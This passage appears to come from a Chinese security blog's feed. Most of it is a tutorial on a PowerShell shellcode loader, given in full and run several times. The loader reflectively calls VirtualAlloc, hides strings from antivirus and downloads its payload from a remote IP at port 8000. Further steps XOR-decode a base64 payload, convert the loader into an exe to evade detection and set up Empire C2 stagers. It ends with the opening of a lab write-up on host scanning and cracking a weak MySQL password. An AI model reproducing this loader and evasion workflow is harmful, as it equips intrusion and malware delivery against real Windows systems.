class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br><br>    <span class="hljs-comment"># 申请一块内存</span><br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$var_code</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br><br>    <span class="hljs-comment"># 将payload复制到内存</span><br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$var_code</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$var_code</span>.length)<br><br>    <span class="hljs-comment"># 执行内存中的payload</span><br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br>&#125;<br></code></pre></td></tr></table></figure><p>修改后的powershell加载器</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Inv&#x27;</span>+<span class="hljs-string">&#x27;oke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)     <br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies()<br>    <span class="hljs-variable">$var_unsafe_native_methods_news</span> = (<span class="hljs-variable">$var_unsafe_native_methods</span>  | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$acode</span> = (<span class="hljs-built_in">New-Object</span> Net.WebClient).<span class="hljs-string">&quot;Down`l`oadData&quot;</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>])<br>    <span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$acode</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$acode</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$acode</span>.length)<br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204221142381.png" alt="image-20240204221142381"></p><p>下载文件</p><p>通过接受本地或者远程的 payload 实现加载器与shellcode分离</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 new.bin<br><br>powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 http://<span class="hljs-number">139.155</span>.<span class="hljs-number">49.43</span>:<span class="hljs-number">8000</span>/shell1.bin<br></code></pre></td></tr></table></figure><p>或者将<strong>powershell 转成 exe</strong>免杀</p><blockquote><p>  <a href="https://github.com/MScholtes/Win-PS2EXE">https://github.com/MScholtes/Win-PS2EXE</a>  </p></blockquote><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp">powershell.exe -ep bypass -command &quot;&amp;<span class="hljs-string">&#x27;.\ps2exe.ps1&#x27;</span> -inputFile <span class="hljs-string">&#x27;d.ps1&#x27;</span> -outputFile <span class="hljs-string">&#x27;d.exe&#x27;</span>&quot;<br></code></pre></td></tr></table></figure></li><li><p>基于上面的免杀使用流程</p><p>将shellcode加载器变成exe</p><p>也就是将下面这个变成exe</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Set-StrictMode</span> <span class="hljs-literal">-Version</span> <span class="hljs-number">2</span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_delegate_type_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">0</span>, <span class="hljs-type">Mandatory</span> = <span class="hljs-variable">$True</span>)] [<span class="hljs-type">Type</span>[]] <span class="hljs-variable">$var_parameters</span>,<br>        [<span class="hljs-type">Parameter</span>(<span class="hljs-type">Position</span> = <span class="hljs-number">1</span>)] [<span class="hljs-type">Type</span>] <span class="hljs-variable">$var_return_type</span> = [<span class="hljs-built_in">Void</span>]<br>    )<br>    <span class="hljs-variable">$var_type_builder</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.DefineDynamicAssembly((<span class="hljs-built_in">New-Object</span> System.Reflection.AssemblyName(<span class="hljs-string">&#x27;ReflectedDelegate&#x27;</span>)), [<span class="hljs-type">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run).DefineDynamicModule(<span class="hljs-string">&#x27;InMemoryModule&#x27;</span>, <span class="hljs-variable">$false</span>).DefineType(<span class="hljs-string">&#x27;MyDelegateType&#x27;</span>, <span class="hljs-string">&#x27;Class, Public, Sealed, AnsiClass, AutoClass&#x27;</span>, [<span class="hljs-type">System.MulticastDelegate</span>])<br>    <span class="hljs-variable">$var_type_builder</span>.DefineConstructor(<span class="hljs-string">&#x27;RTSpecialName, HideBySig, Public&#x27;</span>, [<span class="hljs-type">System.Reflection.CallingConventions</span>]::Standard, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-variable">$var_type_builder</span>.DefineMethod(<span class="hljs-string">&#x27;Inv&#x27;</span>+<span class="hljs-string">&#x27;oke&#x27;</span>, <span class="hljs-string">&#x27;Public, HideBySig, NewSlot, Virtual&#x27;</span>, <span class="hljs-variable">$var_return_type</span>, <span class="hljs-variable">$var_parameters</span>).SetImplementationFlags(<span class="hljs-string">&#x27;Runtime, Managed&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_type_builder</span>.CreateType()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">func_get_proc_address_new</span></span> &#123;<br>    <span class="hljs-keyword">Param</span> (<span class="hljs-variable">$var_module</span>, <span class="hljs-variable">$var_procedure</span>)     <br>    <span class="hljs-variable">$var_unsafe_native_methods</span> = [<span class="hljs-type">AppDomain</span>]::CurrentDomain.GetAssemblies()<br>    <span class="hljs-variable">$var_unsafe_native_methods_news</span> = (<span class="hljs-variable">$var_unsafe_native_methods</span>  | <span class="hljs-built_in">Where-Object</span> &#123; <span class="hljs-variable">$_</span>.GlobalAssemblyCache <span class="hljs-operator">-And</span> <span class="hljs-variable">$_</span>.Location.Split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>].Equals(<span class="hljs-string">&#x27;System.dll&#x27;</span>) &#125;).GetType(<span class="hljs-string">&#x27;Microsoft.Win32.UnsafeNativeMethods&#x27;</span>)<br>    <span class="hljs-variable">$var_gpa</span> = <span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetProcAddress&#x27;</span>, [<span class="hljs-type">Type</span>[]] <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&#x27;System.Runtime.InteropServices.HandleRef&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$var_gpa</span>.Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>([<span class="hljs-type">System.Runtime.InteropServices.HandleRef</span>](<span class="hljs-built_in">New-Object</span> System.Runtime.InteropServices.HandleRef((<span class="hljs-built_in">New-Object</span> IntPtr), (<span class="hljs-variable">$var_unsafe_native_methods_news</span>.GetMethod(<span class="hljs-string">&#x27;GetModuleHandle&#x27;</span>)).Invoke(<span class="hljs-variable">$null</span>, <span class="hljs-selector-tag">@</span>(<span class="hljs-variable">$var_module</span>)))), <span class="hljs-variable">$var_procedure</span>))<br>&#125;<br><br><span class="hljs-keyword">If</span> ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::size <span class="hljs-operator">-eq</span> <span class="hljs-number">8</span>) &#123;<br>    [<span class="hljs-built_in">Byte</span>[]]<span class="hljs-variable">$acode</span> = (<span class="hljs-built_in">New-Object</span> Net.WebClient).<span class="hljs-string">&quot;Down`l`oadData&quot;</span>(<span class="hljs-variable">$args</span>[<span class="hljs-number">0</span>])<br>    <span class="hljs-variable">$var_va</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((func_get_proc_address_new kernel32.dll VirtualAlloc), (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>], [<span class="hljs-type">UInt32</span>]) ([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>])))<br>    <span class="hljs-variable">$var_buffer</span> = <span class="hljs-variable">$var_va</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero, <span class="hljs-variable">$acode</span>.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>    [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::<span class="hljs-built_in">Copy</span>(<span class="hljs-variable">$acode</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$var_buffer</span>, <span class="hljs-variable">$acode</span>.length)<br>    <span class="hljs-variable">$var_runme</span> = [<span class="hljs-type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer(<span class="hljs-variable">$var_buffer</span>, (func_get_delegate_type_new <span class="hljs-selector-tag">@</span>([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]) ([<span class="hljs-built_in">Void</span>])))<br>    <span class="hljs-variable">$var_runme</span>.Invoke([<span class="hljs-built_in">Int</span><span class="hljs-type">Ptr</span>]::Zero)<br><br>&#125;<br></code></pre></td></tr></table></figure><p>然后将第一个下载的文件改成echo &gt; cs2.ps1</p><p>也就是下面这个文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204223822204.png" alt="image-20240204223822204"></p><p>然后从cs2.ps1 中提取出有用的payload部分</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224023599.png" alt="image-20240204224023599"></p><p>后面的参数部分，嵌入到其他文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$enc</span>=[<span class="hljs-type">System.Convert</span>]::FromBase64String(<span class="hljs-string">&#x27;...base64加密后的payload...&#x27;</span>)<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$x</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$x</span> <span class="hljs-operator">-lt</span> <span class="hljs-variable">$enc</span>.Count; <span class="hljs-variable">$x</span>++) &#123;<br>    <span class="hljs-variable">$enc</span>[<span class="hljs-variable">$x</span>] = <span class="hljs-variable">$enc</span>[<span class="hljs-variable">$x</span>] <span class="hljs-operator">-bxor</span> <span class="hljs-number">35</span><br>&#125;<br><br><span class="hljs-variable">$infile</span> = [<span class="hljs-type">System.IO.File</span>]::WriteAllBytes(<span class="hljs-string">&quot;new.bin&quot;</span>,<span class="hljs-variable">$enc</span>)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204224210497.png" alt="image-20240204224210497"></p><p>产生了一个新的文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204225409570.png" alt="image-20240204225409570"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 new.bin<br>powershell <span class="hljs-literal">-ep</span> bypass <span class="hljs-operator">-f</span> d.ps1 http://<span class="hljs-number">139.155</span>.<span class="hljs-number">49.43</span>:<span class="hljs-number">8000</span>/shell1.bin<br></code></pre></td></tr></table></figure><p>或者是将shellcode加载器变成exe</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">shellcodeloader<span class="hljs-selector-class">.exe</span> new<span class="hljs-selector-class">.bin</span><br>shellcodeloader<span class="hljs-selector-class">.exe</span> http:<span class="hljs-comment">//139.155.49.43:8000/shell1.bin</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240204231220345.png" alt="image-20240204231220345"></p></li></ol><h1 id="Powershell工具框架-Empire"><a href="#Powershell工具框架-Empire" class="headerlink" title="Powershell工具框架-Empire"></a>Powershell工具框架-Empire</h1><h2 id="Empire简介"><a href="#Empire简介" class="headerlink" title="Empire简介"></a>Empire简介</h2><p>Empire 是一个针对内网渗透的渗透测试框架  </p><blockquote><p>  <a href="https://github.com/BC-SECURITY/Empire">https://github.com/BC-SECURITY/Empire</a>  </p></blockquote><blockquote><p>  Empire 是一个PowerShell后期漏洞利用工代理工具同时也是一款很强大的后渗透测神器，它建立在  密码学、安全通信和灵架构之上。Empire 实现了无需 Powershell.exe 就可运行 PowerShell  代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络  检测，所有的这些功能都封装在一个以实用性为重点的框架中。  </p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>kali直接安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> powershell-empire<br></code></pre></td></tr></table></figure><p>docker 拉取镜像docker </p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 拉取镜像</span><br><span class="hljs-attribute">docker</span> pull bcsecurity/empire:latest<br><br><span class="hljs-comment"># 运行服务器并打开 rest api 和套接字端口</span><br><span class="hljs-attribute">docker</span> run -dit -p <span class="hljs-number">1337</span>:<span class="hljs-number">1337</span> -p <span class="hljs-number">5000</span>:<span class="hljs-number">5000</span> bcsecurity/empire:latest<br><br></code></pre></td></tr></table></figure><p>修改kali 的配置文件&#x2F;etc&#x2F;powershell-empire&#x2F;client&#x2F;config.yaml 的 servers：</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002854574.png" alt="image-20240205002854574"></p><p>修改成自己的地址</p><p>然后直接执行这个命令</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002917599.png" alt="image-20240205002917599"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205002952278.png" alt="image-20240205002952278"></p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>基本逻辑都是一样的，首先进入到listeners</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003034363.png" alt="image-20240205003034363"></p><p><img src="D:\hexo\source_posts\渗透\Powershell渗透框架.assets\image-20240205003150450.png" alt="image-20240205003150450"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205003509499.png" alt="image-20240205003509499"></p><p>创建一个http的监听器，根据提示填写</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004120288.png" alt="image-20240205004120288"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">execute</span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004205077.png" alt="image-20240205004205077"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004237370.png" alt="image-20240205004237370"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs smali">usestager windows/launcher_bat<br>set Listener test(listenner)<span class="hljs-built_in"></span><br><span class="hljs-built_in">execute </span><br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/Powershell%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/image-20240205004824420.png" alt="image-20240205004824420"></p><p>将获得的bat文件弄出来，运行之后就上线了</p><h2 id="Empire图形界面工具Starkiller"><a href="#Empire图形界面工具Starkiller" class="headerlink" title="Empire图形界面工具Starkiller"></a>Empire图形界面工具Starkiller</h2><p>这个只是一个客户端，服务端建议还是使用kali 或者docker 下载</p><p>安装</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">apt <span class="hljs-keyword">update</span><br>apt install nodejs npm -y<br>npm install --<span class="hljs-keyword">global</span> yarn<br>git clone https:<span class="hljs-comment">//github.com/BC-SECURITY/Starkiller.git</span><br><span class="hljs-keyword">cd</span> Starkiller<br>yarn<br>yarn <span class="hljs-keyword">run</span> serve --host<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RedSun03</title>
    <link href="/2024/02/02/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun03/"/>
    <url>/2024/02/02/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/RedSun03/</url>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>环境搭建时间: 2024-02-02  11:00</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>个人感觉环境搭建还是比较轻松</p><p>由于我们是黑盒测试，所以把所有的主机挂起就可以了</p><p>然后我们已知的cebnos的主机，我给他安装了一个nat网卡，模拟与kali属于同一个网络环境的情况，还要一个网卡与内网网段一致</p><p>其他的都是192.168.93网段的就可</p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>我们只知道存在与kali同网段的主机，但是并不知道是什么ip</p><p>所以直接就nmap收集有哪些主机</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112500897.png" alt="image-20240202112500897"></p><p>138 是我的主机，146应该就是centos的主机了</p><ol><li><p>端口扫描</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202112944742.png" alt="image-20240202112944742"></p><p>开了一个80端口的ngnix反向代理</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202113039436.png" alt="image-20240202113039436"></p><p>有一个blog</p></li><li><p>使用xray进行扫描</p></li><li><p>尝试爆破mysql</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202114401269.png" alt="image-20240202114401269"></p><p>弱密码</p><blockquote><p>root:123</p></blockquote></li><li><p>敏感目录扫描</p><p>发现robots.txt访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120643822.png" alt="image-20240202120643822"></p><p>接着访问</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202120700238.png" alt="image-20240202120700238"></p><p>弱密码爆破</p><p>发现不行</p><p>访问配置文件</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124804243.png" alt="image-20240202124804243"></p><p>注意有波浪号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E9%9D%B6%E5%9C%BA%E8%AE%B0%E5%BD%95/HR/image-20240202124829915.png" alt="image-20240202124829915"></p><p><img 